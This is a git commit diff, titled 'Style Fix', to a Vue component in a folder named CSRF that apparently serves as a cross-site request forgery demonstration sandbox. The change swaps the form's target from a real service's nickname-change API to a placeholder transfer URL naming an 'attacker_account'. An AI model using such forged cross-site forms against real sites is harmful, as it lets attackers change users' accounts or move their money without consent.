c6cd718a677da86eb16e69889f90117761ddd39d
Evgeny <kholoshaee@wlc.capital>
2025-01-29 20:02:00 +0300

    Style Fix

--- src/CSRF/Sandbox.vue
+++ src/CSRF/Sandbox.vue
@@ -6,13 +6,12 @@ const nickname = ref('new_nickname');
 const submitHandler = (): void => {
   if (!form.value) return;
   form.value.submit();
-  window.open('https://passport.whitelist.capital/id/');
 };
 </script>
 
 <template>
   <div>Изменить никнейм:</div>
-  <form ref="form" action="https://passport.whitelist.capital/api/v1/user/nickname/" method="POST">
+  <form ref="form" action="https://example.com/transfer.php?amount=100&recipient=attacker_account" method="POST">
     <input name="nickname" v-model="nickname" />
     <button @click="submitHandler">submit</button>
   </form>
